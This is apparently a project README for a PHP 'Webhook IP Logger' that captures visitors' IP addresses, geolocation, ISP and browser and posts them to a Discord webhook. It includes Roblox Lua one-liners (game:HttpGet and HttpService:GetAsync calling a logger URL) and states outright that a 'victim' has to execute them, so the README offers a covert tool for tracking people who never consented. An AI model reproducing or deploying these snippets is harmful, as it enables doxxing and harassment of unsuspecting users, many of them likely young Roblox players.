# Webhook-IP-Logger
This is a PHP IP logger I made that sends the IP's to a Discord webhook.  
# Features
- Grabs the IP then gets info about it after that it sends it to a webhook you have entered.  
- Gets Geo Location & ISP aswell as the browser
- Filters out bots
- ROBLOX Lua script for it (for exploits that have HttpGet or ROBLOX Studio)
# How to use it on ROBLOX
Step 1: Complete the tutorial above on getting an IP logger link, unless you have your own site.  
Step 2: Put the link of the IP logger in between the qoutations. Exploits is for a script that will only work on  
**Note: The victim will need to execute these scripts. Executing this yourself will only get your own IP.**  
**[Exploits]**  
```lua
game:HttpGet("Site Here")
```
**[Roblox Studio]**  
```lua
game:GetService("HttpService"):GetAsync("Site Here")
```
**[Example]**  
```lua
game:HttpGet("https://mysite.com/iplogger.php")```
